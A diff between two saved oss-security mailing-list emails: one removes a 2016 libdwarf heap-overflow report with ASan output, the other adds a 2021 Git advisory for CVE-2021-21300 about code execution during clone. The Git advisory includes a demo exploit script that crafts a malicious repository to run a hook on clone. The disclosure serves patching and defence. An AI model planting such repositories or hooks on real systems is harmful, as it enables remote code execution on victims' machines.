@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["4046" "Saturday" "8" "October" "2016" "22:17:29" "+0200" "Agostino Sarubbo" "ago@gentoo.org" "<2751056.p2fs675oKu@arcadia>" "104" "[oss-security] libdwarf: heap-based buffer overflow in _dwarf_get_abbrev_for_code (dwarf_util.c) (ANOTHER ONE)" nil nil nil "10" "2016100820:17:29" "[oss-security] libdwarf: heap-based buffer overflow in _dwarf_get_abbrev_for_code (dwarf_util.c) (ANOTHER ONE)" (number mark "U       ago@gentoo.o Oct  8  104/4046  " thread-indent "\"[oss-security] libdwarf: heap-based buffer overflow in _dwarf_get_abbrev_for_code (dwarf_util.c) (ANOTHER ONE)\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["1569" "Tuesday" "9" "March" "2021" "16:03:37" "+0100" "Johannes Schindelin" "Johannes.Schindelin@gmx.de" nil "57" "[oss-security] git: malicious repositories can execute remote code while cloning" nil nil nil "3" nil nil (number mark "U       Johannes.Sch Mar  9   57/1569  " thread-indent "\"[oss-security] git: malicious repositories can execute remote code while cloning\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] git: malicious repositories can execute remote code while cloning" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 17955 invoked by uid 550); 8 Oct 2016 20:17:21 -0000
+Received: (qmail 14081 invoked by uid 550); 9 Mar 2021 20:55:01 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,118 +12,99 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 17884 invoked from network); 8 Oct 2016 20:17:19 -0000
-From: Agostino Sarubbo <ago@gentoo.org>
+Received: (qmail 7906 invoked from network); 9 Mar 2021 20:40:26 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=gmx.net;
+	s=badeba3b8450; t=1615322413;
+	bh=JgUw87DStQ6BREdE91nL3sl+aedLb8w2dMKac/QT8lc=;
+	h=X-UI-Sender-Class:Date:From:To:cc:Subject;
+	b=dMp5EbRgpNXTHN8sqdGQzBgRoaZD+qdotYmTvZ/cu0nVCrIVv/gpL8f/9y3Hzbkmw
+	 QTXu1RQfh75Y/3YXLheueaHFq3eqh/WbNEtB6nFmwcq6Tbc1QVF+EGv9AqggM/uxJr
+	 FSOyxjQrLaSlEoqbnoG5h2ZERlUT8abz0SKUm4P0=
+X-UI-Sender-Class: 01bb95c1-4bf8-414a-932a-4f6e2808ef9c
+Date: Tue, 9 Mar 2021 16:03:37 +0100 (CET)
+From: Johannes Schindelin <Johannes.Schindelin@gmx.de>
+X-X-Sender: virtualbox@gitforwindows.org
 To: oss-security@lists.openwall.com
-Date: Sat, 08 Oct 2016 22:17:29 +0200
-Message-ID: <2751056.p2fs675oKu@arcadia>
-User-Agent: KMail/4.14.10 (Linux/4.1.15-gentoo-r1; KDE/4.14.20; x86_64; ; )
+cc: git-security@googlegroups.com, Matheus Tavares <matheus.bernardino@usp.br>
+Message-ID: <nycvar.QRO.7.76.6.2103091555260.50@tvgsbejvaqbjf.bet>
+User-Agent: Alpine 2.21.1 (DEB 209 2017-03-23)
 MIME-Version: 1.0
-Content-Transfer-Encoding: 7Bit
-Content-Type: text/plain; charset="utf-8"
-Subject: [oss-security] libdwarf: heap-based buffer overflow in _dwarf_get_abbrev_for_code (dwarf_util.c) (ANOTHER ONE)
+Content-Type: text/plain; CHARSET=US-ASCII
+Content-ID: <nycvar.QRO.7.76.6.2103091555281.50@tvgsbejvaqbjf.bet>
+X-Provags-ID: V03:K1:jPKkipnIA3Ty8o1zttWwk/uzzF0v8/0W2xEFBUW+nUe6uBtvNwX
+ 0srw9xqMPgdOnecrdjRMIFKHSXCJWbfJ+SQpMqP0WVPOeduh8BSNo7yuZu3qoloMlosZM5L
+ x1AWdw/hxIkyFtzktQx2PxS9nTFW2bpqszrCChxSjSk29UEgmCo12aHa2Z+RnHP7Oy4cyrl
+ InT7BAelmR8gRATKg8w4Q==
+X-UI-Out-Filterresults: notjunk:1;V03:K0:qi74JA3QShY=:ohCcIAJNaAtKor1IakU9Z6
+ 6uyuxOHzjRexesolzObNJkXfx4MaBMUV7LA/JqSOW0jWovYqIJstDJBxIrB9c5r8pywwOYA/t
+ B6cs3DTYqFO+7+b3TRj9VgoNYU1oam5jfkEPfMEKvXII/DLTHkcQ2XE5QTd0EhesiGdEWK5tV
+ mI2VMa81CYwvg3rF+HNQOgqKYVdGwjjeSFryue8dVQZ5et8dY6rte6aBbBeotNL5F5fLZ8PsK
+ +TDJ9wAIvar3VubuXYXCv7m/tCKdS0ULHMmyb1Mv9SY2lZP9aUdgXBciVp7lyF7EyTeOMUsbH
+ CzOCa5o2FMaTaKJdmHlNiJvV2cE4FOsPoF9BB4n9LovxG7BxEVUW2UjGFdb1b4o2AaRWJklzp
+ CTMBttH7qFce3KxXwAJw7bEQzhqxOZiuoYaNrSX6xNQYKVyYIdF7HiF9T5GX5iidoPBLwp/Hy
+ F2FCCnBpyXhMQ8DyxMFWQKaTWxJCh4Ghtou+Y7np0snds0KSP1mvMp+sErujnLytCxLioBy8n
+ Vep1aJrrt+IprwIGn/QI3fSOivmF3thMwV9fZOG24EPKfvHRyTyMyVJ7wjy6rKmBDUxcovy4M
+ 8UA0YuymNoclApDa/fIqjLXpUSq4pnLAsqlr2ZhbWNR03YToSUbgpTI80qM6S5Wgu8BlnrPda
+ exaK/pID3TwuU3g5PsyKsnmY2o9+8T3lTb0XeTW52jWpM3hi44Se/nO7LtWwpz0Wb4Y8DxGW5
+ OY/UPm5gjV79s+VSbb6crFBNkgRDuAl7iNXffdDoxeIt5g9MMTWkn6q7OB8pw9bgYF9M+kPdA
+ rXBcQ4WKlTqf5HOlNK+MYktceqDM7kIpN4wtrwlfsxWreE/FofuhzAfwiqQUpsu9CtQJv0VOb
+ Q0zr82wSk3YFe2i14gXZTdYTZk5krrhFmi22GDYVQ=
+Subject: [oss-security] git: malicious repositories can execute remote code while cloning
 
-Description:
-libdwarf is a library to consume and produce DWARF debug information.
+Team,
 
-A fuzzing revealed an out bounds read,
+The Git project released new versions on Tuesday, March 9th 2021
+addressing CVE-2021-21300.
 
-The complete ASan output:
+This vulnerability affects platforms with case-insensitive filesystems
+with support for symbolic links, when certain clean/smudge filters are
+configured globally (e.g. Git LFS).
 
-# dwarfdump $FILE
-==24449==ERROR: AddressSanitizer: heap-buffer-overflow on address 
-0x6110000059ed at pc 0x000000606cd5 bp 0x7fff42bdc5f0 sp 0x7fff42bdc5e8
-READ of size 1 at 0x6110000059ed thread T0
-    #0 0x606cd4 in _dwarf_get_abbrev_for_code 
-/tmp/dwarf-20161001/libdwarf/dwarf_util.c:590:9
-    #1 0x576086 in dwarf_siblingof_b 
-/tmp/dwarf-20161001/libdwarf/dwarf_die_deliv.c:1628:12
-    #2 0x517e73 in print_die_and_children_internal 
-/tmp/dwarf-20161001/dwarfdump/print_die.c:1163:17
-    #3 0x517c6b in print_die_and_children_internal 
-/tmp/dwarf-20161001/dwarfdump/print_die.c:1142:13
-    #4 0x5147cc in print_die_and_children 
-/tmp/dwarf-20161001/dwarfdump/print_die.c:921:5
-    #5 0x5147cc in print_one_die_section 
-/tmp/dwarf-20161001/dwarfdump/print_die.c:831
-    #6 0x512262 in print_infos 
-/tmp/dwarf-20161001/dwarfdump/print_die.c:371:16
-    #7 0x4faaea in process_one_file 
-/tmp/dwarf-20161001/dwarfdump/dwarfdump.c:1371:9
-    #8 0x4faaea in main /tmp/dwarf-20161001/dwarfdump/dwarfdump.c:654
-    #9 0x7fa649d7e61f in __libc_start_main /var/tmp/portage/sys-
-libs/glibc-2.22-r4/work/glibc-2.22/csu/libc-start.c:289
-    #10 0x419588 in _start (/usr/bin/dwarfdump-asan+0x419588)
+The fixed versions are v2.17.6, v2.18.5, v2.19.6, v2.20.5, v2.21.4,
+v2.22.5, v2.23.4, v2.24.4, v2.25.5, v2.26.3, v2.27.1, v2.28.1, v2.29.3,
+and v2.30.2.
 
-0x6110000059ed is located 0 bytes to the right of 237-byte region 
-[0x611000005900,0x6110000059ed)
-allocated by thread T0 here:
-    #0 0x4c0ad8 in malloc /var/tmp/portage/sys-devel/llvm-3.8.1-
-r2/work/llvm-3.8.1.src/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:52
-    #1 0x7fa64ae58206 in __libelf_set_rawdata_wrlock /tmp/portage/dev-
-libs/elfutils-0.166/work/elfutils-0.166/libelf/elf_getdata.c:318
+Link to the announcement:
+https://lore.kernel.org/git/xmqqim6019yd.fsf@gitster.c.googlers.com/T/#u
 
-SUMMARY: AddressSanitizer: heap-buffer-overflow 
-/tmp/dwarf-20161001/libdwarf/dwarf_util.c:590:9 in _dwarf_get_abbrev_for_code
-Shadow bytes around the buggy address:
-  0x0c227fff8ae0: 00 00 00 00 00 00 00 00 06 fa fa fa fa fa fa fa
-  0x0c227fff8af0: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd
-  0x0c227fff8b00: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
-  0x0c227fff8b10: fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
-  0x0c227fff8b20: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-=>0x0c227fff8b30: 00 00 00 00 00 00 00 00 00 00 00 00 00[05]fa fa
-  0x0c227fff8b40: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00
-  0x0c227fff8b50: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-  0x0c227fff8b60: 00 fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
-  0x0c227fff8b70: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-  0x0c227fff8b80: 00 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa
-Shadow byte legend (one shadow byte represents 8 application bytes):
-  Addressable:           00
-  Partially addressable: 01 02 03 04 05 06 07 
-  Heap left redzone:       fa
-  Heap right redzone:      fb
-  Freed heap region:       fd
-  Stack left redzone:      f1
-  Stack mid redzone:       f2
-  Stack right redzone:     f3
-  Stack partial redzone:   f4
-  Stack after return:      f5
-  Stack use after scope:   f8
-  Global redzone:          f9
-  Global init order:       f6
-  Poisoned by user:        f7
-  Container overflow:      fc
-  Array cookie:            ac
-  Intra object redzone:    bb
-  ASan internal:           fe
-  Left alloca redzone:     ca
-  Right alloca redzone:    cb
-==24449==ABORTING
+We highly recommend to upgrade.
 
-Affected version:
-20161001 and past
+The addressed issue is:
 
-Fixed version:
-N/A
+* CVE-2021-21300:
+  On case-insensitive filesystems, with support for symbolic links,
+  if Git is configured globally to apply delay-capable clean/smudge
+  filters (such as Git LFS), Git could be fooled into running
+  remote code during a clone.
 
-Commit fix:
-https://sourceforge.net/p/libdwarf/code/ci/2d14a7792889e33bc542c28d0f3792964c46214f/#diff-13 
-and then 
-https://sourceforge.net/p/libdwarf/code/ci/efe48cad0693d6994d9a7b561e1c3833b073a624/#diff-2 
-(because of a mistake)
+  Demo exploit:
 
-Credit:
-This bug was discovered by Agostino Sarubbo of Gentoo.
+  #!/bin/sh
 
-Timeline:
-2016-10-04: bug discovered
-2016-10-04: bug reported privately to upstream
-2016-10-04: upstream realeased a patch
-2016-10-06: blog post about the issue
+  git init delayed-checkout &&
+  (
+  	cd delayed-checkout &&
+  	echo "A/post-checkout filter=lfs diff=lfs merge=lfs" \
+  		>.gitattributes &&
+  	mkdir A &&
+  	printf '#!/bin/sh\n\necho PWNED >&2\n' >A/post-checkout &&
+  	chmod +x A/post-checkout &&
+  	>A/a &&
+  	>A/b &&
+  	git add -A &&
+  	rm -rf A &&
+  	ln -s .git/hooks a &&
+  	git add a &&
+  	git commit -m initial
+  ) &&
+  git clone delayed-checkout cloned
 
-Note:
-This bug was found with American Fuzzy Lop.
+  With Git LFS enabled globally, this will print "PWNED" during the clone
+  on case-insensitive file systems with support for symbolic links (such
+  as NTFS, HFS+, etc).
 
-Permalink:
-https://blogs.gentoo.org/ago/2016/10/06/libdwarf-heap-based-buffer-overflow-in-_dwarf_get_abbrev_for_code-dwarf_util-c-2/
+Credit for finding the vulnerability goes to Matheus Tavares who also
+worked with me on fixing it.
 
+Thanks,
+Johannes
